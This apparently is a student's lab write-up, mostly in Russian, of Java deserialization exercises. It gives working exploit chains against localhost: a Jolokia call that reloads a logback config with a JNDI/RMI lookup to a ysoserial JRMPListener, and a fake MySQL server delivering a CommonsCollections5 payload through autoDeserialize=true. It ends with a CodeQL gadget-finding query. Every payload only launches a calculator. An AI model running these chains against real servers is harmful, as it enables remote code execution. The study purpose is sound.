## 5.6.7. Exercise – Find the Gadget

0. Модифицируем `logback.xml`:

   ```xml
   <configuration>
    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <withJansi>true</withJansi>
        <encoder>
            <pattern>[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n</pattern>
        </encoder>
    </appender>
    <root level="info">
        <appender-ref ref="STDOUT" />
    </root>
    <jmxConfigurator/>
    <insertFromJNDI env-entry-name="rmi://localhost:1099/jndi" as="appName"/>
   </configuration>
   ```

1. Запустим HTTP-сервер, который будет отдавать logback.xml:

   ```shell
   (cd /home/student/FSWA/module-2/build-standalone/src/main/resources && python3 -m http.server 9090)
   ```

2. Запустим spring-приложение с ... в CLASS_PATH:

   ```shell
   (cd /home/student/FSWA/module-2/build-standalone && ./run -new)
   ```

3. Запустим ysoserial в режиме JRMPListener (порт 1099). Пэйлоад -- калькулятор

   ```shell
   (cd /home/student/FSWA/module-2/build-standalone && java -cp ../../tools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "gnome-calculator")
   ```

4. Выполним HTTP-запрос:

   ```shell
   curl 'http://localhost:8080/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/localhost:9090!/logback.xml'
   ```

Результат:

![result](./assets/4/1.jpg)


## 5.6.10. Exercise - MySQL Trickery

Основная идея в том, чтобы использовать мок-сервер MySql, который будет отдавать ysoserial payload. На стороне приложения нужно указать `autoDeserialize=true` в параметрах jdbc, адрес сервера ysoserial и миддлварь

1. Используем https://github.com/fnmsd/MySQL_Fake_Server.git в качестве MySQL-сервера.
   Конфиг:

   ```yml
    {
        "config":{
            "ysoserialPath":"/home/student/FSWA/tools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar",
            "javaBinPath":"java",
            "fileOutputDir":"./fileOutput/",
            "displayFileContentOnScreen":true,
            "saveToFile":true
        },
        "fileread":{
        },
        "yso":{
            "yso_Jdk7u21_calc":["CommonsCollections5","gnome-calculator"]
        }
    }
   ```

   запуск: `python3 server.py`

2. Запустим spring (mvn clean install && ./run -new -debug).

   HelloController:

   ```
    package hello;

    import com.fasterxml.jackson.databind.DeserializationConfig;
    import com.fasterxml.jackson.databind.ObjectMapper;
    import org.springframework.web.bind.annotation.*;
    import org.springframework.web.multipart.MultipartFile;

    import java.sql.*;

    @RestController
    public class HelloController {

        @RequestMapping("/")
        public String index() throws java.lang.ClassNotFoundException, java.sql.SQLException {
            String driver = "com.mysql.cj.jdbc.Driver";
            String user = "yso_Jdk7u21_calc";
            String password = "ubuntu";
            //String url = "jdbc:mysql://0.0.0.0:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
            String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc";
            Class.forName(driver);
            Connection conn = DriverManager.getConnection(url, user, password);

            return url;
        }
    }
   ```

3. Сделаем запрос: curl 'http://localhost:8080'

Результат:

![result](./assets/4/2.jpg)


## 5.6.13. Exercise - Find another Gadget

```java
import semmle.code.java.dataflow.DataFlow

class CustomSink extends DataFlow::ExprNode {
  CustomSink() {
    exists(Method m | m = this.asExpr().(MethodAccess).getMethod() |
      m.hasName("readObject") and
      m.getDeclaringType().hasQualifiedName("org.apache.axis2.context.externalize", "SafeObjectInputStream")
    )
  }
}

class CustomSource extends DataFlow::ExprNode {
  CustomSource() {
    exists(Method m | m.calls(this.asExpr().(MethodAccess).getMethod()) |
      m.hasName("readExternal")
      //and m.getDeclaringType().hasQualifiedName("java.io", "ObjectInputStream")
    )
  }
}

module MyFlowConfiguration implements DataFlow::ConfigSig {
  predicate isSource(DataFlow::Node source) {
    source instanceof CustomSource
  }

  predicate isSink(DataFlow::Node sink) {
    sink instanceof CustomSink
  }
}

import semmle.code.java.Conversions

module MyFlow = DataFlow::Global<MyFlowConfiguration>;

from DataFlow::Node source, DataFlow::Node sink, Interface iface
where MyFlow::flow(source, sink)
and iface.hasQualifiedName("java.io", "Externalizable")
and not sink.asExpr().getFile().getRelativePath().matches("%test%")
and exists(
  Class c | c.fromSource() and c.getCompilationUnit() = source.asExpr().getCompilationUnit() and c.hasSupertype+(iface) and (exists(ConversionSite cs | cs.isImplicit() | cs.getType().toString().matches("MetaDataEntry")))
)
select source, sink, "ok", source.asExpr().getCompilationUnit()

```
